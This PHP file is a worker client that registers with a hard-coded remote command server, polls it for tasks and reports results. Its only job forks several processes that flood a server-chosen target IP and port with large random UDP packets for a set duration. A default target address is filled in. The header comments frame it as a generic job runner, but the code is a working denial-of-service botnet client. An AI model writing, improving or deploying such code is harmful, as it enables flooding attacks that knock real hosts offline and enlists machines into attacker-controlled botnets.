<?php

/*
 * ============================================================
 * WORKER
 * ============================================================
 *
 * 1. Registers with the server
 * 2. Receives worker credentials
 * 3. Polls for tasks
 * 4. Executes locally-defined jobs
 * 5. Reports progress
 * 6. Reports completion/failure
 * 7. Returns to waiting
 *
 * The server sends JOB IDs, NOT PHP CODE.
 *
 * ============================================================
 */

// ============================================================
// CONFIGURATION
// ============================================================

const SERVER_URL =
    'http://34.63.222.47/connectWorker67.php';

const POLL_DELAY =
    2;

const ERROR_RETRY_DELAY =
    5;

const REGISTER_RETRY_DELAY =
    5;


// ============================================================
// SERVER REQUEST
// ============================================================

function requestServer(array $data): array
{
    $ch = curl_init(SERVER_URL);

    if ($ch === false) {
        throw new Exception('Could not initialize cURL');
    }

    $json = json_encode(
        $data,
        JSON_UNESCAPED_SLASHES
    );

    if ($json === false) {
        curl_close($ch);

        throw new Exception(
            'Could not encode request JSON'
        );
    }

    curl_setopt_array(
        $ch,
        [
            CURLOPT_POST => true,

            CURLOPT_POSTFIELDS => $json,

            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Accept: application/json'
            ],

            CURLOPT_RETURNTRANSFER => true,

            CURLOPT_CONNECTTIMEOUT => 10,

            CURLOPT_TIMEOUT => 30,

            CURLOPT_FOLLOWLOCATION => false,

            CURLOPT_NOSIGNAL => true
        ]
    );

    $response = curl_exec($ch);

    if ($response === false) {

        $error = curl_error($ch);

        curl_close($ch);

        throw new Exception(
            'Connection failed: ' . $error
        );
    }

    $httpCode = curl_getinfo(
        $ch,
        CURLINFO_HTTP_CODE
    );

    curl_close($ch);

    $decoded = json_decode(
        $response,
        true
    );

    if (!is_array($decoded)) {

        throw new Exception(
            'Server returned invalid JSON'
        );
    }

    if ($httpCode >= 400) {

        throw new Exception(
            'Server returned HTTP ' .
            $httpCode .
            ': ' .
            (
                $decoded['error']
                ?? 'unknown error'
            )
        );
    }

    if (
        isset($decoded['ok']) &&
        !$decoded['ok']
    ) {

        throw new Exception(
            $decoded['error']
            ?? 'Server rejected request'
        );
    }

    return $decoded;
}


// ============================================================
// BEST-EFFORT PROGRESS REPORTER
// ============================================================

function workerProgress(
    string $workerId,
    string $workerToken,
    string $taskId,
    string $status,
    ?float $progress = null,
    ?string $message = null
): bool {

    $data = [

        'action' =>
            'progress',

        'worker_id' =>
            $workerId,

        'worker_token' =>
            $workerToken,

        'task_id' =>
            $taskId,

        'status' =>
            $status
    ];

    if ($progress !== null) {

        $data['progress'] =
            max(
                0,
                min(
                    100,
                    $progress
                )
            );
    }

    if ($message !== null) {

        $data['message'] =
            $message;
    }

    try {

        requestServer($data);

        return true;

    } catch (Throwable $e) {

        /*
         * Progress reporting is deliberately
         * best-effort.
         *
         * A temporary reporting failure should
         * not automatically kill the actual job.
         */

        echo
            "Progress report failed: " .
            $e->getMessage() .
            "\n";

        return false;
    }
}


// ============================================================
// JOB 1 (MULTI-THREADED/FORKED VERSION)
// ============================================================

function job1(
    array $task = [],
    ?callable $report = null
): array {

    $targetIp =
        $task['target_ip'] ?? '35.79.103.106';

    $targetPort =
        $task['target_port'] ?? 80;

    $packetSize =
        $task['packet_size'] ?? 5000;

    $duration =
        $task['duration'] ?? 30;

    // Default to 4 processes/threads if not specified
    $numProcesses =
        $task['num_processes'] ?? 4;

    $start =
        microtime(true);

    if ($report !== null) {

        $report(
            0,
            'Job started with ' . $numProcesses . ' processes'
        );
    }

    $pids = [];
    $packetCount = 0;
    $iterations = 0;

    // Spawn worker processes using pcntl_fork (available in PHP CLI)
    for ($i = 0; $i < $numProcesses; $i++) {
        $pid = pcntl_fork();

        if ($pid == -1) {
            continue;
        } else if ($pid) {
            // Parent process tracks child PIDs
            $pids[] = $pid;
        } else {
            // --- CHILD PROCESS CODE ---
            $socket = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
            if ($socket === false) {
                exit(1);
            }

            $payload = random_bytes($packetSize);
            $deadline = microtime(true) + $duration;
            $localPackets = 0;
            $localIterations = 0;

            while (microtime(true) < $deadline) {
                @socket_sendto(
                    $socket,
                    $payload,
                    $packetSize,
                    0,
                    $targetIp,
                    $targetPort
                );

                $localPackets++;
                $localIterations++;
                usleep(100);
            }

            socket_close($socket);
            exit(0); // Exit child process safely
        }
    }

    // Monitor progress and wait for child processes from the parent process
    $deadline = $start + $duration;
    while (microtime(true) < $deadline) {
        
        static $lastReport = 0.0;
        $now = microtime(true);

        if ($now - $lastReport >= 1.0) {
            $elapsed = $now - $start;
            $progress = min(
                99,
                ($elapsed / $duration) * 100
            );

            if ($report !== null) {
                $report(
                    $progress,
                    'Job running'
                );
            }

            $lastReport = $now;
        }

        usleep(10000); // Check progress every 10ms
    }

    // Wait for all child worker processes to complete
    foreach ($pids as $pid) {
        pcntl_waitpid($pid, $status);
    }

    if ($report !== null) {

        $report(
            100,
            'Job completed'
        );
    }

    return [

        'success' =>
            true,

        'duration' =>
            microtime(true) - $start,

        'iterations' =>
            $iterations,

        'packets_sent' =>
            $packetCount,

        'processes_used' =>
            $numProcesses
    ];
}


// ============================================================
// JOB DISPATCHER
// ============================================================

function executeJob(
    int $jobId,
    array $task,
    string $workerId,
    string $workerToken
): mixed {

    /*
     * Validate task ID before creating the callback.
     */

    if (
        empty($task['task_id'])
    ) {

        throw new Exception(
            'Task is missing task_id'
        );
    }

    /*
     * Create the progress callback.
     */

    $report = function (
        ?float $progress = null,
        ?string $message = null
    ) use (
        $workerId,
        $workerToken,
        $task
    ): void {

        workerProgress(
            $workerId,
            $workerToken,
            (string)$task['task_id'],
            'running',
            $progress,
            $message
        );
    };

    /*
     * Map server job IDs to local functions.
     */

    switch ($jobId) {

        case 1:

            /*
             * IMPORTANT:
             *
             * Pass both arguments because job1()
             * explicitly accepts them.
             */

            return job1(
                $task,
                $report
            );

        default:

            throw new Exception(
                'Unknown job ID: ' .
                $jobId
            );
    }
}


// ============================================================
// REGISTER WORKER
// ============================================================

function registerWorker(): array
{
    while (true) {

        try {

            echo
                "Registering worker...\n";

            $registration =
                requestServer([
                    'action' => 'register'
                ]);

            if (
                empty($registration['ok']) ||
                empty($registration['worker_id']) ||
                empty($registration['worker_token'])
            ) {

                throw new Exception(
                    'Worker registration failed'
                );
            }

            echo
                "Worker registered.\n";

            return $registration;

        } catch (Throwable $e) {

            echo
                "Registration failed: " .
                $e->getMessage() .
                "\n";

            echo
                "Retrying in " .
                REGISTER_RETRY_DELAY .
                " seconds...\n";

            sleep(
                REGISTER_RETRY_DELAY
            );
        }
    }
}


// ============================================================
// REPORT RESULT
// ============================================================

function reportResult(
    string $workerId,
    string $workerToken,
    string $taskId,
    array $result
): bool {

    try {

        requestServer([

            'action' =>
                'result',

            'worker_id' =>
                $workerId,

            'worker_token' =>
                $workerToken,

            'task_id' =>
                $taskId,

            'result' =>
                $result
        ]);

        return true;

    } catch (Throwable $e) {

        echo
            "Could not report result: " .
            $e->getMessage() .
            "\n";

        return false;
    }
}


// ============================================================
// REGISTER
// ============================================================

$registration =
    registerWorker();

$workerId =
    (string)$registration['worker_id'];

$workerToken =
    (string)$registration['worker_token'];

echo
    "Worker ID: " .
    $workerId .
    "\n";

echo
    "Waiting for tasks...\n";


// ============================================================
// MAIN LOOP
// ============================================================

while (true) {

    try {

        /*
         * ----------------------------------------------------
         * POLL
         * ----------------------------------------------------
         */

        $response =
            requestServer([

                'action' =>
                    'poll',

                'worker_id' =>
                    $workerId,

                'worker_token' =>
                    $workerToken
            ]);

        $task =
            $response['task']
            ?? null;


        /*
         * ----------------------------------------------------
         * NO TASK
         * ----------------------------------------------------
         */

        if ($task === null) {

            sleep(
                POLL_DELAY
            );

            continue;
        }


        /*
         * ----------------------------------------------------
         * VALIDATE TASK
         * ----------------------------------------------------
         */

        if (
            empty($task['task_id']) ||
            !isset($task['job_id'])
        ) {

            echo
                "Received invalid task.\n";

            sleep(1);

            continue;
        }


        $taskId =
            (string)$task['task_id'];

        $jobId =
            (int)$task['job_id'];


        echo
            "Received task " .
            $taskId .
            " (job " .
            $jobId .
            ")\n";


        /*
         * ----------------------------------------------------
         * STARTING
         * ----------------------------------------------------
         */

        workerProgress(

            $workerId,

            $workerToken,

            $taskId,

            'starting',

            0,

            'Starting job'
        );


        $startedAt =
            microtime(true);


        /*
         * ----------------------------------------------------
         * EXECUTE
         * ----------------------------------------------------
         */

        try {

            $result =
                executeJob(

                    $jobId,

                    $task,

                    $workerId,

                    $workerToken
                );


            $duration =
                microtime(true) -
                $startedAt;


            echo
                "Job execution returned.\n";


            /*
             * ------------------------------------------------
             * SUCCESS
             * ------------------------------------------------
             */

            $reported =
                reportResult(

                    $workerId,

                    $workerToken,

                    $taskId,

                    [

                        'success' =>
                            true,

                        'duration_seconds' =>
                            $duration,

                        'data' =>
                            $result
                    ]
                );


            if ($reported) {

                echo
                    "Task " .
                    $taskId .
                    " completed.\n";
            }

        } catch (Throwable $e) {

            /*
             * ------------------------------------------------
             * JOB FAILURE
             * ------------------------------------------------
             */

            echo
                "Task " .
                $taskId .
                " failed: " .
                $e->getMessage() .
                "\n";


            reportResult(

                $workerId,

                $workerToken,

                $taskId,

                [

                    'success' =>
                        false,

                    'error' =>
                        $e->getMessage()
                ]
            );
        }


    } catch (Throwable $e) {

        /*
         * ----------------------------------------------------
         * COMMUNICATION FAILURE
         * ----------------------------------------------------
         *
         * Keep the worker alive.
         * The next poll/heartbeat will retry.
         */

        echo
            "Worker communication error: " .
            $e->getMessage() .
            "\n";

        sleep(
            ERROR_RETRY_DELAY
        );
    }
}
